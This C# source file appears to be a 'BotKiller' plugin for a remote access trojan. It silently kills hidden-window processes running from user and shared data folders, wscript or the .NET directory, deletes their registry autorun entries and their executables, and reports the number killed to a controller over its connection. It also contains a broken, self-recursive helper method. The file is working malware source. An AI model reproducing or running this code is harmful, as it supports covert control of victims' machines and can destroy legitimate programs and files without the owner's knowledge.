using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Security.Principal;
using MessagePackLib.MessagePack;
using Plugin;

namespace Miscellaneous.Handler
{
    public class HandleBotKiller
    {
        int count = 0;
        public void RunBotKiller()
        {

            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    if (Inspection(p.MainModule.FileName.ToLower()))
                        if (!IsWindowVisible(p.MainWindowHandle))
                        {
                            string pName = p.MainModule.FileName;
                            p.Kill();
                            RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\Run", pName);
                            RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", pName);
                            System.Threading.Thread.Sleep(200);
                            File.Delete(pName);
                            System.Threading.Thread.Sleep(200);
                            count++;
                        }
                }
                catch { }
            }
            if (count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "BotKiller";
                msgpack.ForcePathObject("Count").AsString = count.ToString();
                Connection.Send(msgpack.Encode2Bytes());
            }
        }

        private bool Inspection(string threat)
        {
            if (threat == Process.GetCurrentProcess().MainModule.FileName.ToLower()) return false;
            if (threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData).ToLower())) return true;
            if (threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile).ToLower())) return true;
            if (threat.Contains("wscript.exe")) return true;
            if (threat.StartsWith(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Microsoft.NET").ToLower())) return true;
            return false;
        }

        private bool IsWindowVisible(string lHandle)
        {
            return IsWindowVisible(lHandle);
        }

        private static void RegistryDelete(string regPath, string payload)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true))
                {
                    if (key != null)
                        foreach (string valueOfName in key.GetValueNames())
                        {
                            if (key.GetValue(valueOfName).ToString().Equals(payload))
                                key.DeleteValue(valueOfName);
                        }
                }
                if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, true))
                    {
                        if (key != null)
                            foreach (string valueOfName in key.GetValueNames())
                            {
                                if (key.GetValue(valueOfName).ToString().Equals(payload))
                                    key.DeleteValue(valueOfName);
                            }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("RegistryDelete: " + ex.Message);
            }
        }

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);
    }

}
